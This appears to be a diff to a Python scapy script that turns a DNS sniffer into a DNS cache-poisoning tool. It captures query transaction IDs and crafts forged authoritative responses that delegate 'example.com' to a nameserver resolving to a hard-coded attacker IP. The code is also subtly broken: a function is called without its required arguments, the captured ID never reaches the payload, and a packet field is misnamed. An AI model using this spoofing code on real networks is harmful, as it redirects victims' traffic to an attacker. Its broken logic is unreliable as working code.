@@ -12,12 +12,16 @@ src_ip = None
 src_port = None
 dst_ip = None
 dst_port = None
+txid = None
+attacker_ip = "10.0.0.230"
+domain_to_poision = "example.com"
 
 
 def process_packet(packet):
     # Check if the packet has a DNS layer
     if scapy.DNS in packet:
         dns_layer = packet[scapy.DNS]
+        txid = dns_layer.id
         src_ip = packet[scapy.IP].src
         dst_ip = packet[scapy.IP].dst
         if scapy.TCP in packet:
@@ -27,10 +31,50 @@ def process_packet(packet):
             src_port = packet[scapy.UDP].sport
             dst_port = packet[scapy.UDP].dport
         print(f"DNS request: {dns_layer.show()}")
-        print(src_ip, src_port,dst_ip,dst_port,dns_layer.id)
+        print(src_ip, src_port,dst_ip,txid)
+        
+        send_packet()
+        
+def dns_payload():
+    payload = scapy.DNS(
+        id        = txid,
+        qr        = 1,
+        # opcode    = QUERY,
+        aa        = 1,
+        tc        = 0,
+        rd        = 1,
+        ra        = 1,
+        z         = 0,
+        ad        = 0,
+        cd        = 0,
+        # rcode     = ok,
+        qdcount   = 1,
+        ancount   = 0,
+        nscount   = 1,
+        arcount   = 1
+    )
+    
+    payload.qd = scapy.DNSQR(qname = domain_to_poision, qtype= "A", qclass = "IN")
+    payload.ns = scapy.DNSRR(rrname = domain_to_poision, type = "NS", rdata = f"ns1.{domain_to_poision}", ttl = 84600)
+    payload.ar = scapy.DNSRR(rrname = f"ns1.{domain_to_poision}", type = "A", ttl = 604800, rdata = attacker_ip)
     
     
-scapy.sniff(iface = interface, prn=process_packet)
+    return payload
+        
+        
+payload = dns_payload()
+
+def send_packet(src_ip, src_port, dst_ip, dst_port, payload):
+    ip_packet = scapy.IP(src = src_ip, dst = dst_ip)
+    udp_segment = scapy.UDP(sport = src_port, dst_port = dst_port)
+    
+    final_packet = ip_packet/udp_segment/payload
+    scapy.send(final_packet)
+
+
+    
+    
+scapy.sniff(iface = interface, filter = "ip",prn=process_packet)
 
 
 
